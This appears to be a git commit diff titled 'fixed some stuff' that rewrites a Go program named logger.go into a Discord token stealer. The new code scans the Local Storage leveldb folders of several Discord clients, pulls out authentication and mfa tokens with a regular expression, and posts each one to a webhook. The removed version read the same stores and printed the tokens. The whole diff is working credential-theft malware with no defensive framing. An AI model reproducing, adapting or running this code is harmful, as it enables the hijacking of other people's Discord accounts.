937ec6227981fd5075a8521fd808566dbd069715
Ap0mano <apomanko1@gmail.com>
2021-11-19 21:22:16 +0100

    fixed some stuff

--- logger.go
+++ logger.go
@@ -1,53 +1,42 @@
 package main
 
 import (
-	"fmt"
+	"io/ioutil"
+	"net/http"
+	"net/url"
 	"os"
-	"strings"
+	"path/filepath"
+	"regexp"
+)
+
+var (
+	logs             []string
+	tokens           []string
+	appdata, _       = os.UserConfigDir()
+	webhook          = ""
+	directories      = []string{"discord", "Lightcord", "discordptb", "discordcanary"}
+	authorization, _ = regexp.Compile("[N][\\w-]{23}[.][\\w-]{6}[.][\\w-]{27}|mfa.[A-Za-z0-9-_]{84}")
 )
 
 func main() {
-	allpaths := getPaths()
-	var tokens []string = getTokens(allpaths)
-	fmt.Println(tokens)
-}
-
-func getTokens(paths []string) []string {
-	var tokens []string
-	for _, ele := range paths {
-		files, _ := os.ReadDir(ele)
+	for _, directory := range directories {
+		directory = filepath.Join(appdata, directory, "Local Storage", "leveldb")
+		files, _ := os.ReadDir(directory)
 		for _, file := range files {
-			if !strings.Contains(file.Name(), ".ldb") && !strings.Contains(file.Name(), ".log") {
-				continue
-			}
-			openedFile, _ := os.ReadFile(fmt.Sprintf("%v/%v", ele, file.Name()))
-			index := strings.Index(string(openedFile), "oken")
-			if index > 1 && index+100 < len(openedFile) {
-				s_string := string(openedFile[index : index+100])
-				q_ind := strings.Index(string(s_string), `"`) + 1
-				if q_ind+59 < 100 && s_string[q_ind : q_ind+60][len(s_string[q_ind:q_ind+60])-1:] == `"` {
-					tokens = append(tokens, s_string[q_ind:q_ind+59])
-				}
-			}
+			logs = append(logs, filepath.Join(directory, file.Name()))
 		}
 	}
-	return tokens
-}
 
-func getPaths() []string {
-	workName := [4]string{"discord/Local Storage/leveldb/", "discordptb/Local Storage/leveldb/", "discordcanary/Local Storage/leveldb/", "Google/Chrome/Default/Local Storage/leveldb/"}
-	var workingPaths []string
-
-	home, _ := os.UserHomeDir()
-	cache, _ := os.UserCacheDir()
-	appdata, _ := os.UserConfigDir()
-	fmt.Printf("\nhome: %v", home)
-	fmt.Printf("\ncache: %v", cache)
-	fmt.Printf("\nappdata: %v\n", appdata)
-	for _, ele := range workName {
-		if _, err := os.Stat(fmt.Sprintf("%v/%v", appdata, ele)); !os.IsNotExist(err) {
-			workingPaths = append(workingPaths, fmt.Sprintf("%v/%v", appdata, ele))
+	for _, log := range logs {
+		file, _ := os.Open(log)
+		buffer, _ := ioutil.ReadAll(file)
+		match := authorization.FindString(string(buffer))
+		if match != "" {
+			tokens = append(tokens, match)
 		}
 	}
-	return workingPaths
+
+	for _, token := range tokens {
+		http.PostForm(webhook, url.Values{"content": {"\ntoken: " + token}})
+	}
 }
